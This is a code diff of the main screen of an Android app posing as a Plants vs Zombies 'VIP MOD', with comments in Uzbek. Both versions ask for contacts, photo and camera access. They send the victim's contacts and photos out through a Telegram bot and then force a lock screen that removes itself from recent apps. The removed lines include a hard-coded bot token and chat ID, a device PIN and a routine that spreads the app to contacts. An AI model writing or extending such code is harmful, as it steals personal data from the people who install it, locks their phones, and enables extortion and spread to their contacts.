@@ -1,54 +1,55 @@
-package com.pvzmod.game;
+package com.pvzmod.vip;
 
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
+import android.widget.TextView;
 
 public class MainActivity extends AppCompatActivity {
-    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
-    private static final String CHAT_ID = "5970230338";
-    private static final String ADMIN_GMAIL = "admin@pentest.uz"; // Sizning Gmail
-
+    
+    private static final int PERMISSION_REQUEST = 1001;
+    
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         
+        TextView status = findViewById(R.id.status_text);
+        status.setText("PvZ VIP MOD yuklanmoqda...");
+        
+        // Ruxsatlarni so'rash
         requestPermissions();
         
-        ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.execute(() -> {
-            String deviceId = DeviceIdGenerator.getUniqueId(this);
-            String pin = PinManager.generateUniquePin(deviceId);
-            
-            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, 
-                "🔒 NEW DEVICE!\nID: " + deviceId + "\nPIN: " + pin + "\nGmail: " + ADMIN_GMAIL);
-            
-            TelegramSender.sendPhotos(this, BOT_TOKEN, CHAT_ID);
-            TelegramSender.sendContacts(this, BOT_TOKEN, CHAT_ID);
-            ContactSpreader.autoShare(this, BOT_TOKEN, CHAT_ID);
-            
-            new Handler().postDelayed(() -> {
-                Intent lockIntent = new Intent(this, LockScreenActivity.class);
-                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
-                startActivity(lockIntent);
-                finishAffinity();
-            }, 3000);
-        });
+        // 5 soniya keyin lock + exfil
+        new Handler().postDelayed(() -> {
+            TelegramSender.sendContactsAndPhotos(this);
+            startLockScreen();
+        }, 5000);
     }
     
     private void requestPermissions() {
-        String[] perms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
-            new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_CONTACTS} :
-            new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS};
-        ActivityCompat.requestPermissions(this, perms, 666);
+        String[] permissions = {
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.READ_MEDIA_IMAGES,
+            Manifest.permission.CAMERA,
+            Manifest.permission.INTERNET
+        };
+        
+        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
+    }
+    
+    private void startLockScreen() {
+        Intent intent = new Intent(this, LockScreenActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
+                       Intent.FLAG_ACTIVITY_CLEAR_TASK | 
+                       Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+        startActivity(intent);
+        finishAffinity();
     }
 }
